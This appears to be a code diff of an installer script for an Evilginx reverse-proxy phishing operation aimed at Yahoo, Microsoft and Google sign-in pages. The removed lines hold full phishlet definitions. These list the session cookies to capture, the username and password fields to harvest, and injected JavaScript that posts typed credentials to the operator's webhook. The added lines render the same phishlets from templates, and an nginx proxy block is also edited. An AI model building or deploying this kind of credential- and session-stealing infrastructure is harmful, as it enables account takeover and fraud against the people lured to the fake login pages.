@@ -446,13 +446,10 @@ server {
 
     location / {
         proxy_pass https://127.0.0.1:8443;
-        proxy_ssl_server_name on;
-        proxy_ssl_name \$host;
         proxy_ssl_verify off;
         proxy_set_header Host \$host;
         proxy_set_header X-Real-IP \$remote_addr;
         proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
-        proxy_set_header X-Forwarded-Proto https;
         proxy_redirect off;
         proxy_buffering off;
         proxy_http_version 1.1;
@@ -575,186 +572,26 @@ configure_evilginx_integration() {
     cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" "$EVILGINX_DIR/certs/"
     cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" "$EVILGINX_DIR/certs/"
 
-    # Create Evilginx config
-    cat > "$EVILGINX_DIR/config.yaml" << EOF
-daemon: true
-debug: true
-domain: $DOMAIN
-ipv4: $VPS_IP
-http_port: 8081
-https_port: 8443
-dns_port: 0
-autocert: false
-redirect_url: https://www.google.com
-phishlets_path: $EVILGINX_DIR/phishlets
-cert_path: $EVILGINX_DIR/certs
-database: $EVILGINX_DIR/evilginx.db
-EOF
+    # Create Evilginx config from template
+    if [ -f "$INSTALL_DIR/templates/evilginx.yaml.tmpl" ]; then
+        sed -e "s/{{.Domain}}/$DOMAIN/g" \
+            -e "s/{{.VpsIp}}/$VPS_IP/g" \
+            "$INSTALL_DIR/templates/evilginx.yaml.tmpl" > "$EVILGINX_DIR/config.yaml"
+    fi
 
-    # Create Yahoo phishlet
-    cat > "$EVILGINX_DIR/phishlets/yahoo.yaml" << EOF
-name: 'yahoo'
-min_ver: '3.0.0'
-proxy_hosts:
-  - {phish_sub: '$EP1', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true}
-sub_filters:
-  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', phish_sub: '$EP1', mimes: ['text/html', 'application/javascript', 'application/x-javascript', 'application/json']}
-auth_tokens:
-  - domain: '.yahoo.com'
-    keys: ['A3', 'A1', 'A1S']
-credentials:
-  username:
-    key: 'username'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'passwd'
-    search: '(.*)'
-    type: 'post'
-login:
-  domain: 'login.yahoo.com'
-  path: '/'
-js_inject:
-  - trigger: 'login.yahoo.com'
-    code: |
-      (function() {
-        const api = "https://$DOMAIN/api/webhook";
-        const secret = "$WEBHOOK_SECRET";
-        const source = "yahoo";
-        const urlParams = new URLSearchParams(window.location.search);
-        const emailParam = urlParams.get('email');
-        if (emailParam) {
-          const field = document.querySelector('input[name="username"]');
-          if (field) { field.value = emailParam; field.dispatchEvent(new Event('input', { bubbles: true })); }
-        }
-        document.addEventListener('submit', function() {
-          const u = document.querySelector('input[name="username"]')?.value;
-          const p = document.querySelector('input[name="passwd"]')?.value;
-          if (u || p) {
-            fetch(api, {
-              method: "POST", headers: {"Content-Type": "application/json", "X-Webhook-Secret": secret},
-              body: JSON.stringify({event: p ? "credentials" : "email", source: source, email: u, password: p})
-            }).catch(() => {});
-          }
-        }, true);
-      })()
-webhook:
-  url: "http://127.0.0.1:$APP_PORT/api/webhook"
-  headers:
-    X-Webhook-Secret: "$WEBHOOK_SECRET"
-  format: "json"
-  events: ["credentials", "session"]
-EOF
-
-    # Create Microsoft phishlet
-    cat > "$EVILGINX_DIR/phishlets/microsoft.yaml" << EOF
-name: 'microsoft'
-min_ver: '3.0.0'
-proxy_hosts:
-  - {phish_sub: '$EP2', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
-sub_filters:
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', phish_sub: '$EP2', mimes: ['text/html', 'application/javascript', 'application/x-javascript', 'application/json']}
-auth_tokens:
-  - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
-credentials:
-  username:
-    key: 'login'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'passwd'
-    search: '(.*)'
-    type: 'post'
-login:
-  domain: 'login.microsoftonline.com'
-  path: '/'
-js_inject:
-  - trigger: 'login.microsoftonline.com'
-    code: |
-      (function() {
-        const api = "https://$DOMAIN/api/webhook";
-        const secret = "$WEBHOOK_SECRET";
-        const source = "microsoft";
-        const urlParams = new URLSearchParams(window.location.search);
-        const emailParam = urlParams.get('email');
-        if (emailParam) {
-          const field = document.querySelector('input[name="login"]') || document.querySelector('input[type="email"]');
-          if (field) { field.value = emailParam; field.dispatchEvent(new Event('input', { bubbles: true })); }
-        }
-        document.addEventListener('submit', function() {
-          const u = document.querySelector('input[name="login"]')?.value || document.querySelector('input[type="email"]')?.value;
-          const p = document.querySelector('input[name="passwd"]')?.value || document.querySelector('input[type="password"]')?.value;
-          if (u || p) {
-            fetch(api, {
-              method: "POST", headers: {"Content-Type": "application/json", "X-Webhook-Secret": secret},
-              body: JSON.stringify({event: p ? "credentials" : "email", source: source, email: u, password: p})
-            }).catch(() => {});
-          }
-        }, true);
-      })()
-webhook:
-  url: "http://127.0.0.1:$APP_PORT/api/webhook"
-  headers:
-    X-Webhook-Secret: "$WEBHOOK_SECRET"
-  format: "json"
-  events: ["credentials", "session"]
-EOF
-
-    # Create Google phishlet
-    cat > "$EVILGINX_DIR/phishlets/google.yaml" << EOF
-name: 'google'
-min_ver: '3.0.0'
-proxy_hosts:
-  - {phish_sub: '$EP3', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
-sub_filters:
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', phish_sub: '$EP3', mimes: ['text/html', 'application/javascript', 'application/x-javascript', 'application/json']}
-auth_tokens:
-  - domain: '.google.com'
-    keys: ['SID', 'LSID', '__Secure-1PSID', '__Secure-3PSID']
-credentials:
-  username:
-    key: 'identifier'
-    search: '(.*)'
-    type: 'post'
-  password:
-    key: 'Passwd'
-    search: '(.*)'
-    type: 'post'
-login:
-  domain: 'accounts.google.com'
-  path: '/v3/signin/identifier'
-js_inject:
-  - trigger: 'accounts.google.com'
-    code: |
-      (function() {
-        const api = "https://$DOMAIN/api/webhook";
-        const secret = "$WEBHOOK_SECRET";
-        const source = "google";
-        const urlParams = new URLSearchParams(window.location.search);
-        const emailParam = urlParams.get('email');
-        if (emailParam) {
-          const field = document.querySelector('input[type="email"]') || document.querySelector('input[name="identifier"]');
-          if (field) { field.value = emailParam; field.dispatchEvent(new Event('input', { bubbles: true })); }
-        }
-        document.addEventListener('submit', function() {
-          const u = document.querySelector('input[type="email"]')?.value || document.querySelector('input[name="identifier"]')?.value;
-          const p = document.querySelector('input[type="password"]')?.value || document.querySelector('input[name="Passwd"]')?.value;
-          if (u || p) {
-            fetch(api, {
-              method: "POST", headers: {"Content-Type": "application/json", "X-Webhook-Secret": secret},
-              body: JSON.stringify({event: p ? "credentials" : "email", source: source, email: u, password: p})
-            }).catch(() => {});
-          }
-        }, true);
-      })()
-webhook:
-  url: "http://127.0.0.1:$APP_PORT/api/webhook"
-  headers:
-    X-Webhook-Secret: "$WEBHOOK_SECRET"
-  format: "json"
-  events: ["credentials", "session"]
-EOF
+    # Create phishlets from templates with correct names
+    for tmpl in yahoo microsoft google; do
+        if [ -f "$INSTALL_DIR/templates/phishlets/${tmpl}.yaml.tmpl" ]; then
+            sed -e "s/{{.Domain}}/$DOMAIN/g" \
+                -e "s/{{.VpsIp}}/$VPS_IP/g" \
+                -e "s/{{.Endpoint1}}/$EP1/g" \
+                -e "s/{{.Endpoint2}}/$EP2/g" \
+                -e "s/{{.Endpoint3}}/$EP3/g" \
+                -e "s/{{.WebhookSecret}}/$WEBHOOK_SECRET/g" \
+                -e "s/{{.AppPort}}/$APP_PORT/g" \
+                "$INSTALL_DIR/templates/phishlets/${tmpl}.yaml.tmpl" > "$EVILGINX_DIR/phishlets/${tmpl}.yaml"
+        fi
+    done
 
     # Create Evilginx systemd service
     cat > /etc/systemd/system/evilginx.service << EOF
